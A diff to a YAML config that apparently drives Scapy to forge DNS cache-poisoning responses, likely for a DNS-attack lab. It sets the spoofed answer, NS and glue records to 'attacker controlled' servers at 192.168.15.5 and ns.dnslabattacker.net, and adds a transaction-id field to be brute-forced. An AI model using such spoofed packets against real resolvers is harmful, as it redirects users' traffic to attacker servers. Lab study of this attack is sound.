@@ -8,27 +8,31 @@ send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight
                 dport: 33333 # 33333 is hardcoded setup port
 
                 DNS: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNS
+                  id: 0 # Need to brute force this
+                  qr: 1 # Response
                   qdcount: 1
                   ancount: 1
                   nscount: 1
                   arcount: 1
                   qd:
                     qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
-                    qtype: 1 # A
-                    qclass: 1 # IN
+                    qtype: "A" # A
+                    qclass: "IN" # IN
                   an:
                     rrname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
-                    type: 1
-                    rclass: 1
+                    type: "A"
+                    rclass: "IN"
                     rdata: "192.168.15.5" # Attacker controlled dns
                   ns:
                     rrname: "example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
-                    type: 2 # NS
-                    rclass: 1
+                    type: "NS" # NS
+                    rclass: "IN"
+                    ttl: 86400
                     rdata: "ns.dnslabattacker.net" # Attacker controlled dns name
                   ar:
                     rrname: "ns.dnslabattacker.net" # Attacker controlled dns name
-                    type: 1
-                    rclass: 1
+                    type: "A"
+                    rclass: "IN"
+                    ttl: 86400
                     rdata: "192.168.15.5" # Attacker controlled dns
-    iface: "eth0"
+    iface: "ens33"
